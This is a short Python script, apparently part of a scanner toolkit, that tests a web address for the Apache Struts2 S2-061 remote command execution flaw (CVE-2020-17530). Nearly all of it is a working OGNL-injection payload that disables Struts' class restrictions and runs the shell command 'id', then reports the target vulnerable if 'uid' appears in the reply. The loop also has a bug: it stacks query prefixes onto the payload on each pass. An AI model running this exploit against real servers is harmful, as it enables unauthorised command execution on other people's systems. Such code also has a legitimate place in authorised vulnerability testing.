import requests,re
import urllib
import urllib.parse as urlparse


def s2_061(url):
    relsult = {
        'name': 'Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）',
        'vulnerable': False
    }
    cmd = 'id'
    payload = "%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27" + cmd + "%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"
    ps = ['id', 'pid', 'name', 'uid', 'm', 'a']
    try:
        for p in ps:
            payload = "/?{0}=".format(p) + payload
            vurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vurl, timeout=3)
            if re.search('uid', req.text):
                relsult['vulnerable'] = True
                relsult['url'] = url
                relsult['payload'] = vurl
                relsult['about'] = 'https://blog.csdn.net/qq_36197704/article/details/111226322'
                return relsult
        return relsult
    except:
        return relsult
